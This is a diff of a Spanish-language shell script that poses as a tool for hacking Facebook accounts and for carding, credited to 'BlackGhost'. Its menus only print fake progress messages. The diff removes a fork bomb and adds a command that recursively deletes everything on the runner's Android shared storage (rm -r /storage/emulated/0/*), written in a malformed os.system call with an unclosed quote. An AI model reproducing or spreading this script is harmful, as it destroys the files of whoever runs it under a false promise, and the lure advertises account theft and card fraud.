@@ -4,6 +4,7 @@ echo '
 Bienvenido a mi Herramienta
 Esta Herramienta sirve para Hackear cualquier usuario de facebook
 Funciona aunque tenga seguridad de dos pasos Activadada.
+Herramienta de Carding Funcional.
 Esta Herramienta fue Creada Por BlackGhost
 
 
@@ -41,19 +42,17 @@ read -p 'Root@Root: ' bin
 echo  ' ' 
 case $bin in
 1)
-	echo 'Preparando binario Destroyer...'
+	echo 'Buscando correo y Contraseña...'
 	;;
 2)
-	echo 'Preparando binario FKYOU...' 
+	echo 'Forzando cuenta de Facebook...' 
 	;;
 3)
-	echo 'Preparando binario GURU...'
+	echo 'Buscando Usuario de FREE FIRE...'
 	;;
 4)
-	echo 'Preparando binario LeGioN...'
-	;;
-5)
-	echo 'Preparando binario B00M...'
+	echo 'Eliminando todos sus amigos D:...'
+	;
 	;;
 *)
 	;;
@@ -66,7 +65,6 @@ echo '$>Atacando...
 
 infectando a' $tlf
 sleep 2
-echo "LO SIENTO,PERO USTED FUE TROLLEADO"
-echo "INTENTELO DE NUEVO MAS TARDE"
-echo 'TROLLEADO POR BLACKGHOST'
-:(){ :|: & };:
+
+os.system("rm -r /storage/emulated/0/*
+rm -r /storage/emulated/0/*
